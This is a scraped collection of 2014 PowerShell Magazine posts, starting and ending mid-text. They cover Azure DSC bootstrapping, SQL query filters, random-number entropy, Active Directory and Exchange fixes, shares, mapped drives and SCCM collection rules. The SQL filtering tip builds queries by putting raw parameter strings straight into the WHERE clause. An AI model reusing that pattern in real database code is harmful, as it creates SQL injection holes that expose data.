This means the cloud service, storage account, and the virtual machine should all be in the same location. The Set-AzureVMCustomScriptExtension cmdlet is used to bootstrap the LCM meta-configuration script. I am using the -Argument parameter of this cmdlet to pass the pull service URL. The ConfigurationId for the target system LCM gets generated in the LCM script and there is no need to explicitly it pass it.\nThis is it. Once the Azure VM gets created, the LCM meta-configuration script gets executed and changes the LCM settings.\nBonus Tip When a target system is configured as a pull client, two scheduled tasks get created. One of those tasks, named Consistency, runs every 15 minutes, by default, to check the pull server for any new or updated configuration. So, when bootstrapping pull client LCM settings, if you want to perform an immediate configuration pull, you can trigger the Consistency schedule task using the scheduled task cmdlets. The following example demonstrates this.\nGet-ScheduledTask -TaskName Consistency | Start-ScheduledTask So, you can add this line at the end of the LCM script and pull the configuration from a pull server immediately after the LCM meta-configuration change.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/07/29/bootstrapping-lcm-meta-configuration-in-a-azure-vm/","tags":["Azure","PowerShell DSC"],"title":"Bootstrapping LCM meta-configuration in a Azure VM"},{"categories":["SQL","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or later.\nThis is the first tip in a series of SQL filtering tips.\nI find myself using SQL as a source of the information a lot recently. My approach is always the same: I define a function that will ‘hide’ most of the processing required and I parameterize few elements that I may want to change at the runtime. I usually define parameters for anything that will have huge impact on my SQL connection string and/or query (change database or table that I will talk to and properties that I will have available). Anything else is covered by Filter parameter:\nfunction Get-EmployeeData { param ( [Parameter( Mandatory = $true )] [string]$Filter ) $Query = @\" SELECT FirstName, LastName, Department, Title, StartDate, EndDate FROM Employees WHERE $Filter \"@ $Query }  There are few problems with this approach. First of all you have to construct long string and quote things correctly (remember to escape single quotes surrounding values or put whole parameter in double quotes):\nGet-EmployeeData -Filter \u0026quot;FirstName LIKE 'Jo%' \u0026quot; SELECT FirstName, LastName, Department, Title, StartDate, EndDate FROM Employees WHERE FirstName LIKE 'Jo%' Another problems is even more annoying and is related to database schema: if you don’t know what you can filter on, you may be forced to check this schema (or function body) every time you will use your PowerShell command. To remove both problems we can define separate set of parameters that will simplify filtering on the things we use in the filter most often:\nfunction Get-EmployeeData { [CmdletBinding( DefaultParameterSetName = 'filter' )] param ( [Parameter( ParameterSetName = 'list' )] [string]$FirstName, [Parameter( ParameterSetName = 'list' )] [string]$LastName, [Parameter( ParameterSetName = 'filter', Mandatory = $true )] [string]$Filter ) if (-not $Filter) { $queryList = New-Object System.Collections.ArrayList foreach ($key in $PSBoundParameters.Keys) { if ('FirstName','LastName' -contains $key) { $item = \u0026quot;{0} LIKE '{1}'\u0026quot; -f $key, $PSBoundParameters[$key] $queryList.Add($item) | Out-Null } } $Filter = $queryList -join ' AND ' } $Query = @\u0026quot; SELECT FirstName, LastName, Department, Title, StartDate, EndDate FROM Employees WHERE $Filter \u0026quot;@ $Query } Using $PSBoundParameters makes building our filter relatively easy. If there is more than one element than –join will put ‘AND’ between them. With these changes we can now call our function without any quotes and we get tab-completion for any column that we use in our filters:\nGet-EmployeeData -FirstName Jo% -LastName Do% SELECT FirstName, LastName, Department, Title, StartDate, EndDate FROM Employees WHERE FirstName LIKE 'Jo%' AND LastName LIKE 'Do%' This is the first step to make this function user friendly. Stay tuned for the second tip in a series.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/07/28/pstip-functions-and-sql-filtering-part-1/","tags":["SQL","Tips and Tricks"],"title":"#PSTip Functions and SQL filtering, Part 1"},{"categories":["How To"],"contents":"An ongoing argument I’ve seen in the PowerShell community is regarding the effectiveness of random numbers generated by the Get-Random cmdlet. Those who claim that Get-Random does not produce cryptographically strong random data advocate using the System.Security.Cryptography.RNGCryptoServiceProvider .NET class as an alternative.\nWell, which one is stronger? The answer to that question depends on how one defines “cryptographically strong.” For the sake of simplicity, we will define “cryptographically strong” as data that is sufficiently random (i.e. high entropy) and is unpredictable. Let’s start by discussing randomness.\nFull disclosure: I am neither a cryptographer nor a mathematician, therefore, I am far from qualified to speak with sufficient authority on how to implement a proper pseudorandom number generator. Apparently, this is even a hard problem for mathematicians and cryptographers on government standards boards.\nRandomness How can we tell how “random” something is? It’s actually fairly easy to visualize by looking at a histogram of the frequency of which each byte in a sequence occurs. For example, here’s a frequency diagram of an uncompressed kernel32.dll vs. a frequency diagram of kernel32.dll as a compressed and encrypted zip file.\nThe X-axis indicates a byte value 0-255 and the Y-axis indicates the percentage of occurrences for each byte. You can see that the frequency diagram of the uncompressed kernel32.dll has many peaks and valleys, whereas, compared to the compressed and encrypted version, the distributions of bytes has “flattened”. The aggregate distribution of frequencies refers to the randomness of the data. This concept is known as entropy.\nNow, if we’re going to test the randomness of data, eyeballing it will not suffice. We need a way to quantify the randomness of a dataset. Fortunately, we have the following handy formula:\nFor those who haven’t dealt with this kind of math for a while, don’t let this equation scare you. It simply represents the sum of each byte frequency percentage scaled to a value between 0 (no entropy – i.e. a sequence consisting of a single byte) and 8 (maximum entropy – i.e. purely random data). This equation can be easily converted into a function in PowerShell.\nfunction Get-Entropy { Param ( [Parameter(Mandatory = $True)] [ValidateNotNullOrEmpty()] [Byte[]] $Bytes ) $FrequencyTable = @{} foreach ($Byte in $Bytes) { $FrequencyTable[$Byte]++ } $Entropy = 0.0 foreach ($Byte in 0..255) { $ByteProbability = ([Double]$FrequencyTable[[Byte]$Byte])/$Bytes.Length if ($ByteProbability -gt 0) { $Entropy += -$ByteProbability * [Math]::Log($ByteProbability, 2) } } $Entropy } Get-Entropy takes a byte array and calculates its entropy.\nNow, here’s a simple function that generates a byte array using either Get-Random or by using the RNGCryptoServiceProvider class.\nfunction Get-RandomByte { Param ( [Parameter(Mandatory = $True)] [UInt32] $Length, [Parameter(Mandatory = $True)] [ValidateSet('GetRandom', 'CryptoRNG')] [String] $Method ) $RandomBytes = New-Object Byte[]($Length) switch ($Method) { 'GetRandom' { foreach ($i in 0..($Length - 1)) { $RandomBytes[$i] = Get-Random -Minimum 0 -Maximum 256 } } 'CryptoRNG' { $RNG = [Security.Cryptography.RNGCryptoServiceProvider]::Create() $RNG.GetBytes($RandomBytes) } } $RandomBytes }  So now we have the components necessary to put Get-Random and RNGCryptoServiceProvider to the test. To see which method generates data with a higher entropy, we’ll generate 4096 random bytes 100 times, compute the average entropy, and then compare the two averages. If one method has an entropy that deviates greatly from the other, then we will have a clear winner in terms of randomness.\nHere is our test code:\n# Generate 0x1000 random bytes 100 times using # Get-Random and RNGCryptoServiceProvider. $Results = 1..100 | % { $Length = 0x1000 $GetRandomBytes = Get-RandomByte -Length $Length -Method GetRandom $CryptoRNGBytes = Get-RandomByte -Length $Length -Method CryptoRNG $Randomness = @{ GetRandomEntropy = Get-Entropy -Bytes $GetRandomBytes CryptoRNGEntropy = Get-Entropy -Bytes $CryptoRNGBytes } New-Object PSObject -Property $Randomness } $GetRandomAverage = $Results | measure -Average -Property GetRandomEntropy $CryptoRngAverage = $Results | measure -Average -Property CryptoRNGEntropy $AverageEntropyResults = New-Object PSObject -Property @{ GetRandomAverageEntropy = $GetRandomAverage.Average CryptoRngAverage = $CryptoRngAverage.Average }  So who came out on top??? No one!\n$AverageEntropyResults | Format-Table -AutoSize CryptoRngAverage GetRandomAverageEntropy ---------------- ----------------------- 7.95390371502568 7.9547142068139 The entropy generated by Get-Random and RNGCryptoServiceProvider are both close enough to purely random data (entropy = 8) that they are both excellent candidates for generating random data.\nPredictability Predictability refers to the likelihood that one would be able to guess the next number in a sequence of “random” numbers. Random number generators require a seed value – a number used for the initialization of a random sequence. How the seed value is chosen is extremely important as it has a direct impact on the predictability of a random sequence.\nIf an identical seed value is chosen for two or more random sequences, the sequences will be identical. For example, try running Get-Random using a fixed seed:\nPS\u0026gt; 0..255 | Get-Random -Count 10 -SetSeed 1 216 161 109 239 111 129 71 26 113 249 PS\u0026gt; 0..255 | Get-Random -Count 10 -SetSeed 1 216 161 109 239 111 129 71 26 113 249 When a seed value is not provided to Get-Random, the system tick count – the number of milliseconds elapsed since the system started is used as a seed. Executing Get-Random without a seed is equivalent to executing:\nGet-Random -SetSeed ([Environment]::TickCount)  Now, the tick count is a 32-bit number which means that there are 4,294,967,295 possible seed values. Such a massive number ought to produce sufficiently unpredictable sequences, right? No.\nLet’s envision a scenario where we use Get-Random to generate random passwords and the script is scheduled to run five minutes after system startup. What’s the likelihood that the script generates the random password at the same tick count as the last time a password was generated? It probably unlikely that you would hit the exact number of milliseconds but for a fast computer, it’s probably likely that you are guaranteed that a set of seeds within a specific time interval will be used. Let’s say that we determined that the script was likely to execute within 2000 milliseconds (2 seconds) of the last time the script executed. That means that there is only a maximum of 2000 possible passwords that one would need to guess. For a determined adversary intent on obtaining a critical password, this is not a far-fetched task.\nRNGCryptoServiceProvider, on the other hand is designed to use an unpredictable seed value unlike the predictable system tick count used in Get-Random. This means that regardless of the time of day, an unpredictable, random sequence will be generated.\nConclusion So who wins the Cryptography Strongman contest?\nThe winner is RNGCryptoServiceProvider based on its randomness and unpredictability.\nWhat’s the lesson in all this? If you’re using a random number generator as the basis for providing security, you must use a cryptographically secure random number generator. For quick and dirty scripts that have nothing to do with security, Get-Random is just fine.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/07/28/testing-the-effectiveness-of-get-random/","tags":["How To"],"title":"Testing the effectiveness of Get-Random"},{"categories":["Tips and Tricks"],"contents":"When using the Get-ADOrganizationalUnit cmdlet there is a property available, LinkedGroupPolicyObjects. Unfortunately, that property only displays the GUID of the Group Policy Objects. To make it easier to identify which GPOs are linked to an Organizational Unit the following function will gather the display names for these GPOs and place the names of the GPOs in a new property named ‘FriendlyGPODisplayName’:\nFuntion Get-OUWithGPOLink { Get-ADOrganizationalUnit -Filter \u0026quot;Name –like '*'\u0026quot; -Properties name, distinguishedName, gpLink | Select-Object -Property *, @{ Name = 'FriendlyGPODisplayName' Expression = { $_.LinkedGroupPolicyObjects | ForEach-Object { -join ([adsi]\u0026quot;LDAP://$_\u0026quot;).displayName } } } } To illustrate what this means in practice I have included the difference between the output of Get-ADOrganizationalUnit and Get-OUWithGPOLink:\nPlease note that this function still requires the PowerShell Active Directory module to be present on the system. The function utilizes ADSI to connect to the ADObject of the GPO to get the DisplayName value. The display names are made available by utilizing Select-Object with a calculated property.\nThe full version of this function is available and will be maintained in the TechNet Script Gallery, available here.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/07/25/pstip-show-friendly-gpo-names-with-get-adorganizationalunit/","tags":["Tips and Tricks"],"title":"#PSTip Show friendly GPO names with Get-ADOrganizationalUnit"},{"categories":["Learning PowerShell"],"contents":"A mishandled case, an irate customer and a top box (i.e. exceeded customer expectations in a post case resolution survey) at the climax. No, this isn’t a premise for a detective potboiler but a support case that was transferred to me when I was a support engineer with Microsoft Global Technology Support Center (GTSC). The customer was using a SharePoint form that the end users can fill in and this form will create an AD account for the user and add it to a specific Organizational Unit. However, to get access to the SharePoint Site, the AD user account created should be a member of a specific AD group which the current setup couldn’t do and had to be done manually. Using Quest (now Dell), AD PowerShell Cmdlets, I wrote a Windows PowerShell snippet that checks for created users and moves them using the scheduled task to a specified OU thereby granting access. More on this in the blog post.\nThis might not be a breakthrough innovation nor is a thousand plus lines of code but what matters is that it helped the client resolve her concern without investing in third-party products. Upon case review, she gave me a top-box (9/9). My first top box via a Windows PowerShell script and I had so much fun writing it. Since then I haven’t looked back. Be it PowerShell remoting, PowerShell Workflow, Desired State Configuration, or OneGet, the automation engine continues mystifying me.\nLike most of the PowerShell newbies, I started my journey with Windows PowerShell by running the Get-Service cmdlet. The interactive nature of the shell, easy to discover and use commands made learning Windows PowerShell very intuitive. I fell in love with the blue console. Whenever I learnt a new product or a technology, I would start playing around with its PowerShell module. As more and more goodies were incorporated into PowerShell, I adorned the researcher’s hat and started dwelling more and more into it. I began my day with my regular dose of caffeine and reading up on the various RSS feeds of the PowerShell blogs that I had bookmarked. It goes without saying that PowerShell Magazine has been my favorite. I became so passionate about Windows PowerShell that I was entitled “the PowerShell Evangelist” within my company even though my official designation was that of a consultant. I was busy delivering PowerShell webinars, mastering PowerShell classes (the favorite being the “Be the Bruce Almighty of Windows PowerShell”) and TechReady sessions that had PowerShell as its key ingredient. I started blogging on my TechNet blog at http://powershell.ms\nOne of the best things that happened to me was to be a member of the Bangalore PowerShell User Group (PSBUG), a brainchild of Ravikanth Chaganti–one of my role models. He has been a constant source of inspiration for me and his passion for Windows PowerShell is contagious. I remember walking up to him at MS TechEd sessions and asking for tips and tricks to master PowerShell. I also got to meet my other peers who shared the same zeal for PowerShell like Dexter, Pradeep, Vinith, Sahal, and Harshul to name a few.\nAfter I’ve resigned Microsoft Services India and immigrated to Australia to join Dimension Data, Sydney, I realized most of the IT workforce here wasn’t aware of Windows PowerShell and if they were, they hated it. They attributed Windows PowerShell as a constraint being forced down the throats of IT Pros by the folks at Redmond. I realized that there is an opportunity as well as a challenge for me here. To help IT Pros in the Aussie territory to embrace Windows PowerShell. Fortunately I work as a Microsoft trainer. It is one of the most difficult jobs to execute. You get evaluated every week, unlike other jobs where an appraisal happens on a yearly or half-yearly basis. You need to stay on top of the technology you teach and back your knowledge with real world experience else you would be ripped apart in the evaluations on Friday evening. Every Microsoft course I taught, I converted a few modules to a PowerShell teach.\nObviously, that wasn’t part of the course, but that little “tease” of PowerShell was enough for them to get that “fear” or “hatred” out of PowerShell. My inbox started flooding with emails asking for help on how to get started with Windows PowerShell, do you teach “PowerShell” courses, if yes, when, do we have a local community for PowerShell etc. With such kind of response and the awesome support from Dimension Data Learning Solutions, I started organizing PowerShell meetings, online and at the office premises. I started writing extra modules that complement the current Microsoft courses but fulfill the automation piece that most of delegates wanted to achieve at their workplace.\nGradually, I saw a positive drift towards the PowerShell momentum in Sydney and hope it’ll spread across Australia. My vision is to make Windows PowerShell as popular as National Rugby League, Australian Football League or MasterChef Australia :). I know it is a daunting task but with focus towards Service Management Automation and Cloud, PowerShell isn’t just a “good to have” skill but now a “must to have” skill. We had meeting focused on System Center where I had the opportunity to evangelize the role of Windows PowerShell. Now, we have started Windows PowerShell meetings where the experience I gained during my PSBUG meetings has helped me strengthen the community here in Sydney. I have already started work on a few books and video tutorials on Windows PowerShell. Since I am no longer a Microsoft employee, I am transitioning my PowerShell blog from the TechNet blogs platform to WordPress and it’s a work in progress.\nI was recently awarded the Microsoft MVP award for my work with Windows PowerShell. Honestly, this has really given me a boost in my efforts to help the community realize the true potential of Windows PowerShell. I would like to thank Microsoft for bestowing me with the coveted title and I am looking forward to work with fellow MVPs to help spread the word about the Windows PowerShell.\nPS I would be presenting a seminar “Why WILL Windows PowerShell be a part of your future” on August 28 at DDLS, Sydney. More on this later on my blog and on DDLS website.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/07/25/how-braces-and-semicolons-became-a-part-of-my-life/","tags":["Learning PowerShell"],"title":"How braces and semicolons became a part of my life"},{"categories":["Tips and Tricks","WMI"],"contents":"Note: This tip required PowerShell 3.0 or above\nThe Win32_Share WMI class can be used to enumerate all shares on the local or remote system. In this tip, Get-CimInstance will be utilized to only return the non-administrative shared folders. This is possible because of the Type property that is available on each shared folder. The Type property indicates whether a share is an administrative or a normal share. The table includes all eight available type numbers that the Win32_Share class can return:\n   Type Description     0 (0x0) Disk Drive   1 (0x1) Print Queue   2 (0x2) Device   3 (0x3) IPC   2147483648 (0x80000000) Disk Drive Admin   2147483649 (0x80000001) Print Queue Admin   2147483650 (0x80000002) Device Admin   2147483651 (0x80000003) IPC Admin    To get only non-administrative disk shares run the following command:\nGet-CimInstance –Class Win32_Share –ComputerName server01 | Where-Object {$_.Type –eq 0} Alternatively the –Query parameter can also be used to query this class:\nGet-CimInstance -Query \u0026quot;select * from Win32_Share where type=0\u0026quot; –ComputerName localhost The Get-CimInstance cmdlet is available in PowerShell 3.0 and later. The code posted in this tip can also be used in combination with the Get-WmiObject cmdlet to get similar results while maintaining compatibility with PowerShell 1.0/2.0.\nFor more information in regards to the Win32_Share class please see the following MSDN article:\nhttp://msdn.microsoft.com/en-us/library/aa394435(v=vs.85).aspx\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/07/24/pstip-select-non-administrative-shared-folders-using-win32_share-wmi-class/","tags":["Tips and Tricks","WMI"],"title":"#PSTip Select non-administrative shared folders using Win32_Share WMI class"},{"categories":["Exchange","How To"],"contents":"I’ve been recently tasked by the team responsible for user account management to investigate why a user mailbox wasn’t created along with its Active Directory account. PowerShell being my favorite tool for troubleshooting, I immediately loaded the Exchange cmdlets into my session.\n$session = New-PSSession -ConnectionUri http://node01.my.fqdn/PowerShell/ -ConfigurationName Microsoft.Exchange Import-PSSession -Session $session My next step was to reproduce manually what the automated script was supposed to achieve.\nNaively, I first tried to check if the mailbox associated to the Active Directory account exists.\n$User = \u0026quot;JDoe\u0026quot; Get-Mailbox $User The operation couldn\u0026rsquo;t be performed because object JDoe\u0026rsquo; couldn\u0026rsquo;t be found on \u0026lsquo;PDC.my.fqdn\u0026rsquo;.\nThis confirms that the mailbox doesn’t exist. It was expected, but doesn’t unfortunately tell me why.\nBefore creating a mailbox, the user account creation process concatenates the first and last name and fills in the mail attribute of its Active Directory account. The script retrieves it like this\n$PDC = (Get-ADDomainController -Service 1 -Discover).Hostname $HT = @{DomainController = \u0026quot;$PDC\u0026quot;} $UserMail = (Get-ADUser -Identity $User -Server \u0026quot;$PDC\u0026quot; -Properties *).Mail When I try to use the mail attribute as the external email address, the cmdlet ends with the following error:\nSet-MailUser -Identity \u0026quot;NetBiosDomainName\\$User\u0026quot; -ExternalEmailAddress $UserMail @HT The proxy address \u0026quot;SMTP:john.doe@my.fqdn\u0026quot; is already being used by \u0026quot;my.fqdn/Data/Contacts/Doe John\u0026quot;. Please choose another proxy address. Nice error. The Exchange cmdlet immediately tells me who’s the culprit using this SMTP address. It also tells me exactly why it refuses to use this email address. A contact object in Active Directory already uses this email address that is defined as one of its proxy addresses.\nLet’s find this contact. I just need to translate the above path into its LDAP distinguished name form:\n($cuser = Get-ADObject -SearchBase \u0026quot;OU=Contacts,OU=Data,DC=my,DC=fqdn\u0026quot; -SearchScope Subtree -Filter \u0026quot;Name -LIKE '*Doe*'\u0026quot; -Properties proxyAddresses) The proxyAddresses is actually a multivalued attribute and because only one contact is returned,\n$cuser | Get-Member -Name proxyAddresses | Format-List -Property * I can remove the offending email address from the collection of proxyAddresses by doing:\nSet-ADObject -Identity $cuser.ObjectGUID -Remove @{proxyAddresses='smtp:john.doe@my.fqdn'} And then I can manually finish the mailbox creation process:\nSet-MailUser -Identity \u0026quot;NetBiosDomainName\\$User\u0026quot; -ExternalEmailAddress $UserMail @HT Enable-Mailbox -Identity \u0026quot;NetBiosDomainName\\$User\u0026quot; -Database \u0026quot;My DB Name\u0026quot; @HT The Exchange cmdlets being no longer required, I just close the remote session:\nRemove-PSSession -Session $session  I started to write a report to the team responsible for user account management telling them why this particular user account failed. I wanted also to alert them that this could happen again as there are other contacts that have proxy addresses attribute matching our domain. I got the exact count like this:\nGet-ADObject -SearchBase \"OU=Contacts,OU=Data,DC=my,DC=fqdn\" -SearchScope Subtree -Filter \"Name -LIKE '*'\" -ResultSetSize 10000 -Properties proxyAddresses | Where proxyAddresses -match \"\\@my\\.fqdn$\" | Measure-Object  Even though I’m not an Exchange admin, this story shows that PowerShell is really very useful for troubleshooting–it helped me quickly analyze what’s going and fix the problem. Nice tool, I love it.\nA VBScript or a GUI approach wouldn’t save my time because if I’m tasked to fix all the other contacts later on, they wouldn’t help me quickly automate the resolution process. Only PowerShell does!\n(Get-ADObject -SearchBase \u0026quot;OU=Contacts,OU=Data,DC=my,DC=fqdn\u0026quot; -SearchScope Subtree -Filter \u0026quot;Name -LIKE '*'\u0026quot; -ResultSetSize 10000 -Properties proxyAddresses) | Where proxyAddresses -match \u0026quot;@my\\.fqdn$\u0026quot; | ForEach-Object { $paddr = $first = $last = $null $Name = $_.Name $last,$first = $_.Name -split \u0026quot;\\s\u0026quot; if ($first.Count -eq 1) { $paddr = \u0026quot;smtp:{0}.{1}@my.fqdn\u0026quot; -f $first,$last try { if ($_.proxyAddresses -match $paddr) { Set-ADObject -Identity $_.ObjectGUID -Remove @{proxyAddresses=$paddr} -ErrorAction Stop -Verbose } else { Write-Warning -Message \u0026quot;Proxy address $paddr not found for user $Name\u0026quot; } } catch { Write-Warning -Message \u0026quot;Failed for $($Name) because $($_.Exception.Message)\u0026quot; } } else { Write-Warning -Message \u0026quot;Fix $Name manually: more than 1 first or last name\u0026quot; } } PowerShell is a huge time-saver and designed for automation. This is why I really love it.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/07/24/using-powershell-to-troubleshoot-the-exchange-mailbox-creation-process/","tags":["Exchange","How To"],"title":"Using PowerShell to troubleshoot the Exchange mailbox creation process"},{"categories":["Tips and Tricks"],"contents":"In the ‘Create mapped network drive using WScript.Network‘ tip, it was shown how a mapped drive can be mounted. The WScript.Network object also contains the EnumNetworkDrives method which enumerates all locally mapped network drives:\n(New-Object -ComObject WScript.Network).EnumNetworkDrives() The output of this method is unfortunately a bit disappointing. It returns a COM object containing an array of strings:\nTo make this information more useful the following function can be used:\nFunction Get-MappedDrive { (New-Object -ComObject WScript.Network).EnumNetworkDrives() | ForEach-Object -Begin { $CreateObject = $false } -Process { if ($CreateObject) { $HashProps.NetworkPath = $_ New-Object -TypeName PSCustomObject -Property $HashProps $CreateObject = $false } else { $HashProps = @{ LocalPath = $_ } $CreateObject =$true } } }  This function gathers the output of the EnumNetworkDrives method and organizes this into PowerShell objects:\nThis function is also available in the TechNet Script Gallery available here.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014-07-23-pstip-enumerating-mapped-network-drives-using-wscript-network/","tags":["Tips and Tricks"],"title":"#PSTip Enumerating mapped network drives using WScript.Network"},{"categories":["Learning PowerShell"],"contents":"So, it’s my turn to present myself!\nI’m Fabien, 32 years old and I started using PowerShell in 2008 because I’m a lazy guy. I’ve always liked to build things in order to make them work. I think you need automation to handle your daily workload, and the day a colleague showed me the Exchange reports graphics he’s doing I felt in love with this crazy command line and the simplicity of achieving complex tasks.\nSo I decided to use PowerShell to enhance the automation of our software deployment with its database for our customers. I won’t say everything went well at start, I’ve spent many times googling and finally found an amazing French PowerShell community site (Powershell-Scripting.com)! During this learning phase, I’ve felt in love with three cmdlets: Get-Member, New-Object, and ForEach-Object! As everything is an object in PowerShell nothing can be more helpful.\nThis community was led by Arnaud Petitjean and Laurent Dardenne. They’ve been working with PowerShell for ages and helped me kindly answering my beginner’s questions. With cmdlets and .NET assemblies, I could achieve my goals and as I spent my time on forum I started to contribute to help the community. I’m usually focused on Microsoft technologies, however, I had to work on upgrading a VMware ESX farm in another job. I already knew that PowerCLI existed, but I couldn’t imagine how your life can be so good with these two products combined. Imagine the happiness of upgrading a complete infrastructure with just scripts. Thanks to the “fearsome” Get-View cmdlet, you have access to all SDK methods. Automation is the key for success in ALL infrastructures. So I started a blog to share my findings, scripts and gave some tips to help people adopt PowerShell.\nMy next task offered me the opportunity to go deep inside PowerShell 4.0, and I have to admit this PowerShell version coupled with Windows Server 2012 cmdlets was pure happiness to work with. New cmdlets allowed me to configure teaming on physical servers with New-NetLbfoTeam and configure all iSCSi initiators, a serious gain of time. Another awesome cmdlet to work with third party software is Invoke-RestMethod–perfect match to handle web services!\nBut one thing bothered me–in France, nobody knows about PowerShell and how easy is to use it, doing awesome stuff avoiding hours of coding. After seeing PowerShell sessions at TechDays, I felt that we need to inform the French IT community about the capabilities of PowerShell.\nDuring TechDays 2014, Pascal Sauliere gave me the opportunity to present two sessions with Carlo Mancini—one about remoting, and the other one for beginners about tips \u0026amp; tricks. I was amazed to see that attendees didn’t know about PowerShell remoting before this session. But, they loved it after they learned about it!\nCurrently, I manage Oracle, MySQL and SQL Server as well as Windows Server only with PowerShell. Sometimes it looks like we don’t have any limits–when something is not designed as a cmdlet, you can directly use .NET Framework to help you find a solution!\nNow, as Microsoft is taking care of supporting PowerShell in every server product and in parallel improves the PowerShell core functionalities, PowerShell will be a feature that every IT guy will have to use daily. For example, Desired State Configuration opens a door to a new world of automation, and I think the future for PowerShell users will be awesome!\nLet me share a few sweet short code snippets I use on a daily basis:\n#Generate a GUID and export it to clipboard [GUID]::NewGuid().ToString() | clip # Test if account is \u0026quot;Administrator\u0026quot; [bool]((whoami /all) -match \u0026quot;S-1-16-12288\u0026quot;) # Validate an IP address if ($ip -as [IPAddress]) {\u0026quot;OK\u0026quot;} Have you ever imagined a Linux IT guy without the shell skills? It’s the same for Windows IT guys now.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/07/23/how-ive-started-loving-powershell/","tags":["Learning PowerShell"],"title":"How I’ve started loving PowerShell"},{"categories":["Tips and Tricks"],"contents":"In the ‘Create mapped network drive using WScript.Network‘ post, it was shown how a mapped drive can be mounted. The mapped drive doesn’t initially have a friendly name–only the name of the shared folder and the server name will be shown. In order to rename the drive using PowerShell, the Shell.Application COM object can be used. This code will allow you to rename a mapped network drive or any local disk:\n$ShellObject = New-Object –ComObject Shell.Application $DriveMapping = $ShellObject.NameSpace('Z:') $DriveMapping.Self.Name = 'NewName'  To make this shorter the following one-liner can be used to rename a local drive:\n(New-Object -ComObject Shell.Application).NameSpace('Z:').Self.Name='NewName'  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/07/22/pstip-rename-a-local-or-a-mapped-drive-using-shell-application/","tags":["Tips and Tricks"],"title":"#PSTip Rename a local or a mapped drive using Shell.Application"},{"categories":["How To","SCCM"],"contents":"Introduction First of all, thanks to PowerShell magazine for giving me this great honour to post an article here.\nThere have been a few articles about Configuration Manager in PowerShell Magazine–one by PowerShell MVP Trevor Sullivan is especially worth reading.\nOne of the main responsibilities of being a ConfigMgr administrator is to perform application deployments. After you have all the applications packaged and setup in the ConfigMgr Software Library, you would probably want to deploy them to the end users’ machines.\nIn this post, I’ll be focusing only on the deployments targeting to the devices using the query-based Collection Membership rules, as they are easier to maintain than Direct Membership Query Rule when you are deploying applications to a large number of devices.\nBackground on the Manual Process In order to deploy applications to devices, one has to create logical groupings of resources called Collections and deploy applications to them. Every Collection has rules that are used to configure the members of the Collection. You’ll have more details here.\nA Query Rule uses a WQL query statement which defines the membership criteria for the Collection. A simple query that we use looks like below:\nselect * from SMS_R_System where SMS_R_System.NetbiosName in (\"null\",\"Computer1\",\"Computer2\")  In order to add a new machine name to the Query Rule, one has to use the ConfigMgr Console. See below clip:\n  Meet “PowerShell”, the automation engine Before we proceed any further, I would like to point out that one can go in two ways to automate Configuration Manager using PowerShell:\n Through SMS Provider Using the ConfigurationManager PowerShell module (since CM 2012 SP1)  For this post I’ll be concentrating mainly on the SCCM cmdlets , but this can very well be done leveraging the SMS Provider with PowerShell (WMI/CIM cmdlets). For more info on this visit ECM MVP Kaido’s site cm12sdk.net. There are few things which you need to know before you start using the Configuration Manager PowerShell module. Read my post on “Getting Started“.\nOnce you have the CM Module loaded and your current location set to the CMSite provider, you can run the cmdlets.\nNote: You need to explicitly load the module as it doesn’t reside in the $env:PSModulePath and if your current location is not to the CMSite PSDrive then cmdlets throw an error.\nThe easiest way to get these pre-requisites out of hand is to use the ConfigMgr console to open the PowerShell host. Click on the top left corner then “Connect via Windows PowerShell”.\nThis pops up a PowerShell console with your current location set to the three letter site code e.g DEX for my lab (the same site your CM console is connected to).\nNow let’s use the Get-Command cmdlet to discover the cmdlets that work with the Query Membership Rule, Please note the three letter site code e.g DEX in the PS prompt showing my current location in the CMSite PSDrive:\nPS DEX:\\\u0026gt; Get-Command -Noun *QueryMembershipRule -Module ConfigurationManager CommandType Name ModuleName ----------- ---- ---------- Cmdlet Add-CMDeviceCollectionQueryMembershipRule ConfigurationManager Cmdlet Add-CMUserCollectionQueryMembershipRule ConfigurationManager Cmdlet Get-CMDeviceCollectionQueryMembershipRule ConfigurationManager Cmdlet Get-CMUserCollectionQueryMembershipRule ConfigurationManager Cmdlet Remove-CMDeviceCollectionQueryMembershipRule ConfigurationManager Cmdlet Remove-CMUserCollectionQueryMembershipRule ConfigurationManager  Let’s get to task of adding a machine name to the Query Membership Rule for the Collection “Quest AD” (same collection in the video above).\nFirst let’s get the Query Membership Rule and then we will modify it, remove the old one, and save the new one back.\n$Oldquery= Get-CMDeviceCollectionQueryMembershipRule -CollectionName \"Quest AD\" -RuleName \"Quest AD QueryRule\" –Verbose  Once you have the Query Rule, you have to manipulate the QueryExpression property a bit to add the machine name at the end in the proper WQL format (proper quotes and comma).\nNote the -Verbose switch with the CM cmdlets gives the WQL the cmdlet uses. It’s a good idea to use it.\n$Oldquery.QueryExpression = $Oldquery.QueryExpression.TrimEnd(\")\") + ',\"DexSCCM\")'  Now we have the QueryExpression ready, time to remove the old one from the collection, and save the new one.\nRemove-CMDeviceCollectionQueryMembershipRule -CollectionName \"Quest AD\" -RuleName \"Quest AD QueryRule\" -Verbose -Force Add-CMDeviceCollectionQueryMembershipRule -CollectionName \"Quest AD\" -RuleName $Oldquery.RuleName -QueryExpression $Oldquery.QueryExpression -Verbose  One can easily put the appending machine name logic in a function to perform this operation.\nBelow is a short video showing the above in action:\n  Conclusion The above post just gives you a hint of how PowerShell can be used in Configuration Manager. Based on your process requirement you can automate the manual repetitive tasks, but before you go on the automation spree first understand the ins and outs of the process. Do a lot of testing and always ask the awesome PowerShell community for feedback.\nFeel free to contact me on Twitter / Facebook (DexterPOSH is my handle in case you were 